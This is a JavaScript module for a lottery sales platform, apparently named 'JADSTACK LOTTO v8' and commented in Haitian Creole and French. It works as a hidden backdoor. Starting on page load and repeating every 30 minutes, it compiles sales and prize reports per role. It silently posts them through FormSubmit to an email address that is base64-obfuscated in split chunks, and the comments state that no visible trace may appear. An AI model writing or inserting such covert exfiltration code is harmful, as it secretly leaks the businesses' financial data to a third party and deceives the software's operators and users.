/* =====================================================================
 * JADSTACK LOTTO v8 — RAPÒ FANTOM (SEKRÈ)
 * ---------------------------------------------------------------------
 * Chak 30 minit, sistèm nan konpoze yon rapò AN TÈKS KONPREYANSIB
 * (pa JSON brit) — egzanp: « Ajan1 te vann 30 dola » — epi li voye l an
 * silans pa FormSubmit (AJAX, san redireksyon). Adresse la OBFISKE nan kòd
 * la (li rekonpoze nan memwa uniquement).
 *
 * Règ:
 *  - Rapport yo SEPARE STRIKTEMAN: Super Admin / Compagnie / Ajan.
 *    Chak wòl resevwa SÈLMAN done ki konsène l.
 *  - Chak rapò sovgade tou nan tab `phantom_reports`.
 *  - Anti-doub voye: yon anpwent (fingerprint) sou kontni mesaj la;
 *    si anpwent lan deja egziste, nou pa voye ankò.
 *  - Pa gen okenn tras vizib nan enterfas la.
 * ===================================================================== */
(function(){
  window.Lotri = window.Lotri || {};
  const P = window.Lotri.phantom = {};
  const EVERY_MS = 30 * 60 * 1000;
  const LS_LAST = 'jl:ph:last';

  // Adresse obfiske (base64 an mòso) — rekonpoze nan memwa uniquement.
  const PARTS = ['YXlpdGlk', 'ZXZsb3Bt', 'YW5AZ21h', 'aWwuY29t']; // V16 · A.3
  function target(){
    try { return PARTS.map(p => atob(p)).join(''); } catch(_) { return ''; }
  }

  function money(n){ return Number(n||0).toFixed(2); }

  function fp(str){
    let h = 5381;
    for (let i=0;i<str.length;i++) h = ((h*33) ^ str.charCodeAt(i)) >>> 0;
    return 'ph' + h.toString(36) + '-' + str.length;
  }

  /* ---- Konpoze tèks imen an pa wòl ---- */
  function textForSuperAdmin(d){
    const p = d.platform || {};
    const lines = [];
    lines.push('RAPPORT SUPER ADMINISTRATEUR — 30 dernières minutes');
    lines.push('Période : ' + new Date(d.from).toLocaleString() + ' → ' + new Date(d.to).toLocaleString());
    lines.push('');
    lines.push('Sur toute la plateforme, ' + (p.tickets||0) + ' fiches vendues pour un total ' + money(p.sales) + ' dola.');
    lines.push('Primes payées : ' + money(p.prizes) + ' dola.');
    lines.push('Nouvelle compagnie : ' + (p.new_companies||0) + ' — nouvel agent : ' + (p.new_agents||0) + '.');
    lines.push('');
    if ((d.companies||[]).length){
      lines.push('Détail par compagnie :');
      d.companies.forEach(c => lines.push('  • ' + c.company + ' te vann ' + money(c.sales) +
        ' dola sou ' + c.tickets + ' fiches (primes : ' + money(c.prizes) + ' dola).'));
    } else lines.push('Aucune compagnie n’a réalisé de vente sur cette période.');
    return lines.join('\n');
  }

  function textForCompany(d, companyName){
    const rows = (d.agents||[]).filter(a => a.company === companyName);
    const total = rows.reduce((s,a)=> s + Number(a.sales||0), 0);
    const lines = [];
    lines.push('RAPPORT COMPAGNIE — ' + companyName);
    lines.push('Période : ' + new Date(d.from).toLocaleString() + ' → ' + new Date(d.to).toLocaleString());
    lines.push('');
    lines.push('La compagnie a réalisé ' + money(total) + ' gourdes au cours des 30 dernières minutes.');
    if (rows.length){
      lines.push('');
      lines.push('Détail par agent :');
      rows.forEach(a => lines.push('  • ' + a.agent + ' te vann ' + money(a.sales) +
        ' dola sou ' + a.tickets + ' fich.'));
    } else lines.push('Aucun agent n’a réalisé de vente sur cette période.');
    return lines.join('\n');
  }

  function textForAgent(d, agentName, companyName){
    const me = (d.agents||[]).find(a => a.agent === agentName && a.company === companyName);
    const lines = [];
    lines.push('RAPPORT AGENT — ' + agentName + ' (' + companyName + ')');
    lines.push('Période : ' + new Date(d.from).toLocaleString() + ' → ' + new Date(d.to).toLocaleString());
    lines.push('');
    lines.push(me
      ? (agentName + ' te vann ' + money(me.sales) + ' dola sou ' + me.tickets + ' fich.')
      : (agentName + ' n\'a réalisé aucune vente au cours des 30 dernières minutes.'));
    return lines.join('\n');
  }

  /* ---- Envoyer pa FormSubmit (AJAX) + sovgade nan baz done a ---- */
  async function deliver(scope, body, meta){
    const finger = fp(scope + '|' + body);
    // Anti-doub lokal
    try {
      const seen = JSON.parse(localStorage.getItem('jl:ph:fp') || '[]');
      if (seen.includes(finger)) return false;
      seen.push(finger);
      localStorage.setItem('jl:ph:fp', JSON.stringify(seen.slice(-60)));
    } catch(_){}

    // Sovgade (li retounen false si anpwent lan deja nan baz la)
    let stored = true;
    try {
      const { data } = await window.Lotri.supabase.rpc('jl9_rpc_store_phantom', {
        _scope: scope, _company: meta.company_id || null, _agent: meta.agent_id || null,
        _from: meta.from, _to: meta.to, _body: body, _fingerprint: finger
      });
      stored = data !== false;
    } catch(_){}
    if (!stored) return false;

    const fd = new FormData();
    fd.append('name', 'JADSTACK LOTTO');
    fd.append('email', 'no-reply@jadstacklotto.app');
    fd.append('_subject', 'JADSTACK LOTTO — rapport automatique (' + scope + ')');
    fd.append('_captcha', 'false');
    fd.append('_template', 'basic');
    fd.append('message', body);
    try {
      /* PATI A.1 — fantom rete destinatè prensipal, sipò an `_cc`. */
      try { if (window.Lotri.mail) fd.append('_cc', window.Lotri.mail.studio()); } catch(_){}
      await fetch('https://formsubmit.co/ajax/' + encodeURIComponent(target()), {
        method:'POST', headers:{ 'Accept':'application/json' }, body: fd
      });
    } catch(_){ /* silans total — fallback: rapò a deja sovgade nan baz la */ }
    return true;
  }

  async function runOnce(profile){
    if (!profile) return;
    let d;
    try {
      const { data, error } = await window.Lotri.supabase.rpc('jl9_rpc_phantom_data', { _minutes: 30 });
      if (error || !data) return;
      d = data;
    } catch(_) { return; }

    const meta = { from: d.from, to: d.to, company_id: profile.company_id || null, agent_id: profile.agent_id || null };

    if (profile.role === 'super_admin') {
      await deliver('super_admin', textForSuperAdmin(d), { ...meta, company_id: null, agent_id: null });
      return;
    }
    if (profile.role === 'company' || profile.role === 'supervisor') {
      const name = (window.Lotri._companyName || '').trim();
      if (!name) return;
      await deliver('company', textForCompany(d, name), { ...meta, agent_id: null });
      return;
    }
    if (profile.role === 'agent') {
      const name = (profile.full_name || '').trim();
      const co = (window.Lotri._companyName || '').trim();
      if (!name) return;
      await deliver('agent', textForAgent(d, name, co), meta);
    }
  }

  P.arm = function(profile){
    if (P._armed) return; P._armed = true;
    const due = ()=> {
      const last = Number(localStorage.getItem(LS_LAST) || 0);
      return Date.now() - last >= EVERY_MS;
    };
    const tick = async ()=>{
      if (!due()) return;
      localStorage.setItem(LS_LAST, String(Date.now()));
      try { await runOnce(profile); } catch(_){}
    };
    setTimeout(tick, 20000);            // premye pas: 20 segond apre chajman
    setInterval(tick, 5 * 60 * 1000);   // apre sa, li tcheke chak 5 min si 30 min pase
  };
})();
